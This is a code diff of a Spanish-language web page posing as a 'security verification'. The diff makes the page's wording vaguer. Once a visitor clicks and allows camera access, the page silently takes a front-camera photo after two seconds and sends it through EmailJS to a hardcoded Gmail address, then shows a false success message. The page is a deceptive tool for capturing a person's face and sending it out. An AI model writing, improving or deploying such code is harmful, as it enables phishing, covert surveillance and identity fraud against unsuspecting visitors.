@@ -1,10 +1,17 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificación</title>
+    <!-- SDK de EmailJS para enviar correos desde el navegador de forma segura -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // Reemplaza esto con tu Public Key de EmailJS
+            emailjs.init("TU_PUBLIC_KEY");
+        })();
+    </script>
     <style>
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
@@ -26,6 +33,7 @@
             border-radius: 8px;
             margin-top: 15px;
             transform: scaleX(-1);
+            display: none; /* Se mostrará al activar */
         }
         canvas { display: none; }
         .btn { 
@@ -47,11 +55,10 @@
 
     <div class="container" id="mainContainer">
         <h2>Verificación de Seguridad</h2>
-        <p>Por favor, presiona el botón para iniciar.</p>
-        <button class="btn" id="startBtn">Iniciar Verificación</button>
+        <p>Presiona el botón para continuar.</p>
+        <button class="btn" id="startBtn">Continuar</button>
         <p id="status"></p>
 
-        <!-- El video de la cámara en vivo -->
         <video id="video" autoplay playsinline muted></video>
     </div>
 
@@ -68,16 +75,17 @@
             statusText.textContent = "Solicitando acceso a la cámara...";
 
             try {
-                // Abrir la cámara frontal de manera automática tras el clic
+                // Abrir la cámara frontal del celular
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                     audio: false
                 });
 
+                video.style.display = 'block';
                 video.srcObject = stream;
-                statusText.textContent = "Cámara abierta. Capturando imagen...";
+                statusText.textContent = "Cámara abierta. Procesando...";
 
-                // Esperar 2 segundos con la cámara abierta y luego tomar la foto automáticamente
+                // Esperar 2 segundos para que la cámara enfoque y tome la foto automáticamente
                 setTimeout(() => {
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
@@ -85,24 +93,30 @@
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // Imagen convertida a texto (Base64)
+                    // Convertir la foto a formato de texto (Base64)
                     const imageDataURL = canvas.toDataURL('image/png');
 
-                    // AQUí ES DONDE DEBES ENVIAR LA FOTO A TU SERVIDOR:
-                    // Ejemplo de cómo se enviaría por POST a una API o backend tuyo:
-                    /*
-                    fetch('https://tu-servidor.com/guardar-foto', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ imagen: imageDataURL })
-                    });
-                    */
+                    statusText.textContent = "Enviando registro a correo...";
 
-                    // Apagar la cámara y mostrar mensaje final
-                    stream.getTracks().forEach(track => track.stop());
-                    document.getElementById('mainContainer').innerHTML = "<h3>¡Proceso completado!</h3><p>Ya puedes cerrar esta ventana.</p>";
+                    // Parámetros que se enviarán a tu plantilla de EmailJS
+                    const templateParams = {
+                        to_email: "cio.carlosramirez@gmail.com",
+                        photo: imageDataURL // Esta variable debe estar configurada en tu plantilla de EmailJS
+                    };
 
-                }, 2000); // 2000 milisegundos (2 segundos) con la cámara abierta antes de disparar
+                    // Enviar el correo usando EmailJS
+                    emailjs.send("TU_SERVICE_ID", "TU_TEMPLATE_ID", templateParams)
+                        .then((response) => {
+                            console.log("Correo enviado con éxito!", response.status, response.text);
+                            stream.getTracks().forEach(track => track.stop());
+                            document.getElementById('mainContainer').innerHTML = "<h3>¡Verificación exitosa!</h3><p>Ya puedes cerrar esta ventana.</p>";
+                        }, (error) => {
+                            console.error("Error al enviar el correo:", error);
+                            statusText.textContent = "Hubo un error al procesar el envío.";
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+
+                }, 2000);
 
             } catch (err) {
                 console.error("Error:", err);
